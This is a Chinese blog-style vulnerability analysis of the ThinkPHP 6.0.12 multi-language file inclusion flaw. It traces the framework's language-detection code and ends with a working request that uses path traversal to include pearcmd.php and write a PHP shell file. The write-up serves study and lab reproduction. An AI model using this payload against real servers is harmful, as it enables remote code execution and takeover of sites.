<p>title: ThinkPHP V6.0.12多语言漏洞</p>
<hr>
<h2 id="前提条件"><a href="#前提条件" class="headerlink" title="前提条件"></a>前提条件</h2><ul>
<li><p>安装并已知pearcmd.php的文件位置。（默认位置 &#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd.php，Docker版本的镜像中pear默认安装）</p>
</li>
<li><p>需要开启php.ini中register_argc_argv选项。（docker的PHP镜像是默认开启的）</p>
</li>
<li><p>thinkphp开启多语言功能 (app&#x2F;middleware.php)</p>
</li>
</ul>
<p><img src="/tp-V6.0.12.image/image-20240803224836677.png" alt="image-20240803224836677"></p>
<ul>
<li>安装pear：</li>
</ul>
<p>1、下载 go-pear.phar  <a href="http://pear.php.net/go-pear.phar">http://pear.php.net/go-pear.phar</a></p>
<p>2、执行 php go-pear.phar 设置1-12选项路径，安装。</p>
<ul>
<li>直接docker安装</li>
</ul>
<pre><code>docker run --name tp6 -p 8005:80 -d vulfocus/thinkphp:6.0.12
</code></pre>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>从LoadLangPack这个类开始</p>
<p><img src="/tp-V6.0.12.image/image-20240805221247600.png" alt="image-20240805221247600"></p>
<p>每个 middleware 的 <code>handle()</code> 方法都会被调用</p>
<pre><code class="php">public function handle($request, Closure $next)
{
    // 自动侦测当前语言
    $langset = $this-&gt;detect($request);

    if ($this-&gt;lang-&gt;defaultLangSet() != $langset) {
        $this-&gt;lang-&gt;switchLangSet($langset);
    }

    $this-&gt;saveToCookie($this-&gt;app-&gt;cookie, $langset);

    return $next($request);
}
</code></pre>
<p>接着进入到<code>detect()</code>方法</p>
<pre><code class="php">protected function detect(Request $request): string
    {
        // 自动侦测设置获取语言选择
        $langSet = &#39;&#39;;

        if ($request-&gt;get($this-&gt;config[&#39;detect_var&#39;])) {
            // url中设置了语言变量
            $langSet = strtolower($request-&gt;get($this-&gt;config[&#39;detect_var&#39;]));
        } elseif ($request-&gt;header($this-&gt;config[&#39;header_var&#39;])) {
            // Header中设置了语言变量
            $langSet = strtolower($request-&gt;header($this-&gt;config[&#39;header_var&#39;]));
        } elseif ($request-&gt;cookie($this-&gt;config[&#39;cookie_var&#39;])) {
            // Cookie中设置了语言变量
            $langSet = strtolower($request-&gt;cookie($this-&gt;config[&#39;cookie_var&#39;]));
        } elseif ($request-&gt;server(&#39;HTTP_ACCEPT_LANGUAGE&#39;)) {
            // 自动侦测浏览器语言
            $match = preg_match(&#39;/^([a-z\d\-]+)/i&#39;, $request-&gt;server(&#39;HTTP_ACCEPT_LANGUAGE&#39;), $matches);
            if ($match) {
                $langSet = strtolower($matches[1]);
                if (isset($this-&gt;config[&#39;accept_language&#39;][$langSet])) {
                    $langSet = $this-&gt;config[&#39;accept_language&#39;][$langSet];
                }
            }
        }
</code></pre>
<p>依次检查了<code>GET</code> <code>header</code> <code>cookie</code> ,没有任何过滤, 直接赋值给了 <code>$langSet</code></p>
<p>然后默认的情况下<code>allow_lang_list</code>为空</p>
<p><img src="/tp-V6.0.12.image/image-20240805223124452.png" alt="image-20240805223124452"></p>
<p><code>$langSet</code>直接被赋值给了<code>$range</code> , 然后返回了<code>$range</code><br>继续回到 <code>handle()</code>里面<br><code>if ($this-&gt;lang-&gt;defaultLangSet() != $langset)</code></p>
<p><img src="/tp-V6.0.12.image/image-20240805224025189.png" alt="image-20240805224025189"></p>
<p><img src="/tp-V6.0.12.image/image-20240805223755079.png" alt="image-20240805223755079"></p>
<p>如果返回的<code>$range</code>–&gt;<code>$langset</code>不等于默认的<code>zh-cn</code> ,就会调用 <code>$this-&gt;lang-&gt;switchLangSet($langset)</code></p>
<pre><code class="php">public function switchLangSet(string $langset)
{
    if (empty($langset)) {
        return;
    }

    // 加载系统语言包
    $this-&gt;load([
        $this-&gt;app-&gt;getThinkPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.php&#39;,
    ]);

    // 加载系统语言包
    $files = glob($this-&gt;app-&gt;getAppPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.*&#39;);
    $this-&gt;load($files);

    // 加载扩展（自定义）语言包
    $list = $this-&gt;app-&gt;config-&gt;get(&#39;lang.extend_list&#39;, []);

    if (isset($list[$langset])) {
        $this-&gt;load($list[$langset]);
    }
}
</code></pre>
<p>又调用了<code>load()</code>方法<br>传入的<code>$file</code>参数是拼接而成的</p>
<pre><code>$this-&gt;app-&gt;getThinkPath() . &#39;lang&#39; . DIRECTORY_SEPARATOR . $langset . &#39;.php&#39;

//DIRECTORY_SEPARATOR是一个PHP预定义常量，用于获取当前操作系统的目录分隔符
</code></pre>
<p><img src="/tp-V6.0.12.image/image-20240805225055542.png" alt="image-20240805225055542"></p>
<p><img src="/tp-V6.0.12.image/image-20240805225035537.png"></p>
<p>也就是<code>thinkphp路径/lang/ + 参数$langset + .php</code><br>传入到<code>load()</code>方法</p>
<pre><code class="php">public function load($file, $range = &#39;&#39;): array
{
    $range = $range ?: $this-&gt;range;
    if (!isset($this-&gt;lang[$range])) {
        $this-&gt;lang[$range] = [];
    }

    $lang = [];

    foreach ((array) $file as $name) {
        if (is_file($name)) {
            $result = $this-&gt;parse($name);
            $lang   = array_change_key_case($result) + $lang;
        }
    }

    if (!empty($lang)) {
        $this-&gt;lang[$range] = $lang + $this-&gt;lang[$range];
    }

    return $this-&gt;lang[$range];
}
</code></pre>
<p>判断文件是否存在, 存在的话进入条件中 ,进一步又传入到<code>$this-&gt;parse($name)</code><br>进入到<code>parse()</code>方法</p>
<pre><code class="php">protected function parse(string $file): array
    {
        $type = pathinfo($file, PATHINFO_EXTENSION);

        switch ($type) {
            case &#39;php&#39;:
                $result = include $file;
                break;
            case &#39;yml&#39;:
            case &#39;yaml&#39;:
                if (function_exists(&#39;yaml_parse_file&#39;)) {
                    $result = yaml_parse_file($file);
                }
                break;
            case &#39;json&#39;:
                $data = file_get_contents($file);

                if (false !== $data) {
                    $data = json_decode($data, true);

                    if (json_last_error() === JSON_ERROR_NONE) {
                        $result = $data;
                    }
                }

                break;
        }

        return isset($result) &amp;&amp; is_array($result) ? $result : [];
    }
</code></pre>
<p><code>$type = pathinfo($file, PATHINFO_EXTENSION)</code>返回文件的扩展名<br>显然是<code>php</code><br>继续进入到 <code>$result = include $file</code> ,从而可以实现文件包含<br>从始至终都没有对传入的参数进行一个过滤</p>
<p>接下来就可以利用包含pearcmd.php进行rce了</p>
<h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><p>当开启register_argc_argv时，提交的参数都会传入 $_SERVER[‘argv’]变量内</p>
<p><img src="/tp-V6.0.12.image/886208_CJWJ8H3VV8WA4EF.jpg" alt="img"></p>
<p>&amp;无法分割参数，会被当作一个整体。等号也无法赋值，会被直接传进参数</p>
<p>当使用+号分割，将会作为数组，而pear执行是通过 readPHPArgv()来获取argv内容。<br><img src="/tp-V6.0.12.image/886208_M3QAKURKYMMT7K3.jpg" alt="img"></p>
<h2 id="利用pearcmd-php进行命令执行"><a href="#利用pearcmd-php进行命令执行" class="headerlink" title="利用pearcmd.php进行命令执行"></a>利用pearcmd.php进行命令执行</h2><p><a href="https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp">https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#0x06-pearcmdphp</a></p>
<pre><code>/?+config-create+/&amp;lang=../../../../../../../../../../../usr/local/lib/php/pearcmd&amp;/&lt;?=phpinfo()?&gt;+shell.php
</code></pre>
<p><a href="https://bbs.kanxue.com/thread-276704.htm">https://bbs.kanxue.com/thread-276704.htm</a></p>
<p><a href="https://tttang.com/archive/1865/#toc__3">https://tttang.com/archive/1865/#toc__3</a></p>
